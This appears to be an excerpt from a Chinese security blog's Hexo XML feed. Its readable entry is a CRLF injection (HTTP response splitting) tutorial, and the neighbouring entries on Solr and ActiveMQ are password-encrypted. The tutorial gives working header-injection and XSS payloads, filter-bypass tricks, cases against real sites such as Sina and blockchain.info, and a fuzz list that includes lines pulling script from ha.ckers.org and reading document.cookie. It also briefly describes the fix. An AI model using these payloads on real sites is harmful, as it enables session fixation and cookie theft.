PuSe74l+YD/xHlRoDwmiHRkly5WescPfdlQSTvtgxdHXcTnLaIA3MNvA/FvNcS0gGIGRx2BhggMbBR7msUMM+UH/ot+e5Z9GHkVty3jf12Bpt/+hTbWNSzUb9gyle05jnawJZjDrMkEYheBgE6gF87H6ct8loFHWrKchav8aOOtK5bj4v3C7NcKTS08lb3xTYkOAqwJLmiX4P+lg92VS+Heag/t21Qxz+PNy6erSbKGSgg7Eoz1ZH/7PsBx9u6TKeuFOBO6qjZb6NvLHFYlvX6rzB0r/08kLWe8rjoIJ2XYIN
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Apache Solr</tag>
      </tags>
  </entry>
  <entry>
    <title>CRLF漏洞</title>
    <url>/2019/11/09/CRLF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="CRLF背景"><a href="#CRLF背景" class="headerlink" title="CRLF背景"></a>CRLF背景</h3><p>CRLF是”回车 + 换行”（\r\n）的简称，指的是<strong>回车符</strong>(CR，ASCII 13，\r，%0d) 和<strong>换行符</strong>(LF，ASCII 10，\n，%0a)。 在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS(HTTP相应拆分漏洞）</p>
<h3 id="CRLF举例"><a href="#CRLF举例" class="headerlink" title="CRLF举例"></a>CRLF举例</h3><p>一般网站会在HTTP头中用Location: <a href="http://xxx.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。" target="_blank" rel="noopener">http://xxx.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。</a></p>
<p>正常的302跳转包如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="built_in">Date</span>: Fri, <span class="number">27</span> Jun <span class="number">2019</span> <span class="number">17</span>:<span class="number">52</span>:<span class="number">17</span> GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: <span class="number">154</span></span><br><span class="line">Connection: close</span><br><span class="line">Location: http:<span class="comment">//www.lsowl.top</span></span><br></pre></td></tr></table></figure>
<p>如果输入的是</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//www.lsowl.top%0aSet-cookie:JSPSESSID%3Dtest</span></span><br></pre></td></tr></table></figure>
<p>注入了一个换行，此时的返回包就会变成这样： </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="built_in">Date</span>: Fri, <span class="number">27</span> Jun <span class="number">2019</span> <span class="number">17</span>:<span class="number">52</span>:<span class="number">17</span> GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: <span class="number">154</span></span><br><span class="line">Connection: close</span><br><span class="line">Location: http:<span class="comment">//www.lsowl.top</span></span><br><span class="line"><span class="built_in">Set</span>-cookie: JSPSESSID=test</span><br></pre></td></tr></table></figure>
<p>此时就会产生会话固定漏洞， HRS并不仅限于会话固定，通过注入两个CRLF就能造成一个无视浏览器Filter的反射型XSS。</p>
<p>例如：一个网站进行URL跳转的参数链接如下 <a href="http://www.lsowl.top/?url=xxx，xxx放在Location后面作为一个跳转。如果我们输入的是">http://www.lsowl.top/?url=xxx，xxx放在Location后面作为一个跳转。如果我们输入的是</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//www.lsowl.top/?url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;</span></span><br></pre></td></tr></table></figure>
<p>返回包会变成如下的样子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="built_in">Date</span>: Fri, <span class="number">27</span> Jun <span class="number">2019</span> <span class="number">17</span>:<span class="number">52</span>:<span class="number">17</span> GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: <span class="number">154</span></span><br><span class="line">Connection: close</span><br><span class="line">Location:</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="regexp">/xss/</span>)&gt;</span><br></pre></td></tr></table></figure>
<p>这样浏览器会根据第一个 CRLF把HTTP包分成头和体，然后将体显示出来就会构造成一个XSS</p>
<p>还可以输入</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:%<span class="number">200</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aHTTP/<span class="number">1.1</span>%<span class="number">20200</span>%<span class="number">20</span>OK%<span class="number">0</span>d%<span class="number">0</span>aContent-Type:%<span class="number">20</span>text/html%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:%<span class="number">2047</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p> <code>Content-Length：0</code> 代表header 的结尾，返回包会变成这个样子 </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Encoding: deflate</span><br><span class="line">xxxxxxxx</span><br><span class="line">Locations=https:<span class="comment">//baidu.com</span></span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>触发漏洞</p>
<h3 id="CRLF绕过浏览器xss-filte"><a href="#CRLF绕过浏览器xss-filte" class="headerlink" title="CRLF绕过浏览器xss-filte"></a>CRLF绕过浏览器xss-filte</h3><p>浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。 关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。</p>
<p>所以在绕过时只需要将 X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS。</p>
<h3 id="CRLF挖掘"><a href="#CRLF挖掘" class="headerlink" title="CRLF挖掘"></a>CRLF挖掘</h3><p>通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。 注意输入点和输出点， 提交%0D%0A字符，验证服务器是否响应%0D%0A，若过滤可以通过双重编码绕过 ， 漏洞利用，使杀伤最大化，将漏洞转化为HTML注入，XSS等。 </p>
<h3 id="CRLF案例"><a href="#CRLF案例" class="headerlink" title="CRLF案例"></a>CRLF案例</h3><h4 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h4><p>实际中没有碰见过，这里贴P牛以前的实例</p>
<p>新浪某分站含有一个url跳转漏洞+CRLF</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//xxx.sina.com.cn/?url=%0a%0d%0a%0d%3Cimg%20src=1%3E</span></span><br></pre></td></tr></table></figure>
<p>加入 CRLF Injection 时注入成功， 图片已经输出在页面中</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270515.32.png" alt></p>
<p>测试XSS</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270559.83.png" alt></p>
<p>查看控制台，被XSS Filter拦截，此时注入<code>X-XSS-Protection:0</code></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270619.59.png" alt></p>
<p>用字符编码来绕过XSS Filter，当编码是is-2022-kr时浏览器会忽略%0f，这样我们在onerror后面加个%0f就能绕过filter，前提是注入一个 <code>&lt;meta charset=ISO-2022-KR&gt;</code></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270680.5.png" alt></p>
<h4 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">GET /charts/total-bitcoins?cors=<span class="literal">true</span>&amp;format=csv&amp;lang=english HTTP/<span class="number">1.1</span></span><br><span class="line">Host: api.blockchain.info</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.12</span>; rv:<span class="number">55.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">55.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">HTTP/2.0 200 OK</span></span><br><span class="line"><span class="comment">date: Tue, 31 Oct 2017 15:47:21 GMT</span></span><br><span class="line"><span class="comment">content-type: text/csv; charset=ascii</span></span><br><span class="line"><span class="comment">content-length: 10953</span></span><br><span class="line"><span class="comment">access-control-allow-origin: *</span></span><br><span class="line"><span class="comment">cache-control: public, max-age=60</span></span><br><span class="line"><span class="comment">content-disposition: attachment; filename="total-bitcoins.csv"</span></span><br><span class="line"><span class="comment">content-language: english</span></span><br><span class="line"><span class="comment">"lang"参数出现在了返回包里</span></span><br><span class="line"><span class="comment">现在为了注入CRLF 我们需要url编码一下\r\n "%0D%0A"</span></span><br><span class="line"><span class="comment">据此发送如下请求</span></span><br><span class="line"><span class="comment">https://api2.blockchain.info/charts/total-bitcoins?cors=true&amp;format=csv&amp;lang=en%0ATEST</span></span><br><span class="line"><span class="comment">新的header出现在了返回包里</span></span><br><span class="line"><span class="comment">这里存在CRLF注入漏洞 ，这样可以进行利用CRLF漏洞去执行JavaScript代码，去盗取cookie</span></span><br><span class="line"><span class="comment">最终的Payload</span></span><br><span class="line"><span class="comment">https://api2.blockchain.info/charts/total-bitcoins?cors=true&amp;format=csv&amp;lang=en%0AX-XSS-Protection:0%0AContent-Type:text/html%0AContent-Length:35%0A%0A%3Csvg%20onload%3Dalert%28document.domain%29%3E&amp;__cf_waf_tk__=012853002E6loVIOSyqHfdxrvHJ87MshEnZI</span></span><br></pre></td></tr></table></figure>
<h3 id="CRLF修复"><a href="#CRLF修复" class="headerlink" title="CRLF修复"></a>CRLF修复</h3><p>修复HRS漏洞，过滤\r 、\n之类的换行符，避免输入的数据污染到其他HTTP头。</p>
<h3 id="CRLF-PAYLOAD"><a href="#CRLF-PAYLOAD" class="headerlink" title="CRLF-PAYLOAD"></a>CRLF-PAYLOAD</h3><h4 id="探测漏洞"><a href="#探测漏洞" class="headerlink" title="探测漏洞"></a>探测漏洞</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">0</span>aheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">23</span>%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">3</span>f%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">250</span>aheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">250</span>aheader:header</span><br><span class="line"></span><br><span class="line">/%%<span class="number">0</span>a0aheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">3</span>f%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">23</span>%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">25</span>%<span class="number">30</span>aheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>header:header</span><br><span class="line"></span><br><span class="line">/%u000aheader:header</span><br></pre></td></tr></table></figure>
<h4 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a><strong>开放重定向</strong></h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/www.google.com/%<span class="number">2</span>f%<span class="number">2</span>e%<span class="number">2</span>e%<span class="number">0</span>d%<span class="number">0</span>aheader:header</span><br></pre></td></tr></table></figure>
<h4 id="CRLF-XSS"><a href="#CRLF-XSS" class="headerlink" title="CRLF-XSS"></a><strong>CRLF-XSS</strong></h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:<span class="number">35</span>%<span class="number">0</span>d%<span class="number">0</span>aX-XSS-Protection:<span class="number">0</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a23%<span class="number">0</span>d%<span class="number">0</span>a&lt;svg%<span class="number">20</span>onload=alert(<span class="built_in">document</span>.domain)&gt;%<span class="number">0</span>d%<span class="number">0</span>a0%<span class="number">0</span>d%<span class="number">0</span>a/%<span class="number">2</span>e%<span class="number">2</span>e</span><br></pre></td></tr></table></figure>
<h4 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a><strong>XSS绕过</strong></h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">2</span>Fxxx:<span class="number">1</span>%<span class="number">2</span>F%<span class="number">0</span>aX-XSS-Protection:<span class="number">0</span>%<span class="number">0</span>aContent-Type:text/html%<span class="number">0</span>aContent-Length:<span class="number">39</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">3</span>cscript%<span class="number">3</span>ealert(<span class="built_in">document</span>.cookie)%<span class="number">3</span>c/</span><br></pre></td></tr></table></figure>
<p><strong>Location</strong> </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aContent-Type:%<span class="number">20</span>text%<span class="number">2</span>fhtml%<span class="number">0</span>d%<span class="number">0</span>aHTTP%<span class="number">2</span>f1<span class="number">.1</span>%<span class="number">20200</span>%<span class="number">20</span>OK%<span class="number">0</span>d%<span class="number">0</span>aContent-Type:%<span class="number">20</span>text%<span class="number">2</span>fhtml%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(<span class="string">'XSS'</span>);%<span class="number">3</span>C%<span class="number">2</span>fscript%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
<h4 id="其它一些FUZZ的payload"><a href="#其它一些FUZZ的payload" class="headerlink" title="其它一些FUZZ的payload"></a>其它一些FUZZ的payload</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line">r%<span class="number">0</span>d%<span class="number">0</span>aContentLength:%<span class="number">200</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aHTTP/<span class="number">1.1</span>%<span class="number">20200</span>%<span class="number">20</span>OK%<span class="number">0</span>d%<span class="number">0</span>aContentType:%<span class="number">20</span>text/html%<span class="number">0</span>d%<span class="number">0</span>aContentLength:%<span class="number">2019</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a&lt;html&gt;Injected%<span class="number">02</span>Content&lt;<span class="regexp">/html&gt;</span></span><br><span class="line"><span class="regexp">%0d%0d%0a%0a</span></span><br><span class="line"><span class="regexp">0x0D0x0A</span></span><br><span class="line"><span class="regexp">0x0D0x0D0x0A0x0A</span></span><br><span class="line"><span class="regexp">\r\n</span></span><br><span class="line"><span class="regexp">%5cr%5cn</span></span><br><span class="line"><span class="regexp">%0%0d%0ad%0%0d%0aa</span></span><br><span class="line"><span class="regexp">%0%0D%0AD%0%0D%0AA</span></span><br><span class="line"><span class="regexp">%0d%0aContentType:%20text/</span>html;charset=UTF<span class="number">-7</span>%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:%<span class="number">20129</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">2</span>BADw-html%<span class="number">2</span>BAD4-%<span class="number">2</span>BADw-body%<span class="number">2</span>BAD4-%<span class="number">2</span>BADw-script%<span class="number">2</span>BAD4-alert%<span class="number">28</span>%<span class="number">27</span>XSS,<span class="attr">cookies</span>:%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">2</span>BADw-<span class="regexp">/script%2BAD4-%2BADw-/</span>body%<span class="number">2</span>BAD4-%<span class="number">2</span>BADw-<span class="regexp">/html%2BAD4</span></span><br><span class="line"><span class="regexp">%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/</span>script%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>AContent-Type:html%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>Ehttp:<span class="comment">//www.test.com</span></span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Chtml%<span class="number">3</span>E%<span class="number">3</span>Cbody%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fbody%<span class="number">3</span>E%<span class="number">3</span>Cscript+src%<span class="number">3</span>Dhttp%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fha.ckers.org%<span class="number">2</span>Fs.js%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>location.host%<span class="number">20</span>is:%<span class="number">20</span>%<span class="number">22</span>%<span class="number">2</span>Blocation.host)%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fhtml%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cscript+src%<span class="number">3</span>Dhttp%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fha.ckers.org%<span class="number">2</span>Fxss.js%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E</span><br><span class="line">%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">22</span></span><br><span class="line">%<span class="number">0</span>AContent-type:%<span class="number">20</span>text/html%<span class="number">0</span>A%<span class="number">0</span>Ahttp:<span class="comment">//www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E</span></span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.anquan.us/static/drops/papers-2466.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/papers-2466.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1516335" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1516335</a> </p>
<p><a href="https://c1h2e1.github.io/#" target="_blank" rel="noopener">https://c1h2e1.github.io/#</a> </p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>CRLF</tag>
        <tag>HTTP相应拆分漏洞</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>ActiveMQ系列漏洞复现总结</title>
    <url>/2019/11/09/ActiveMQ%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
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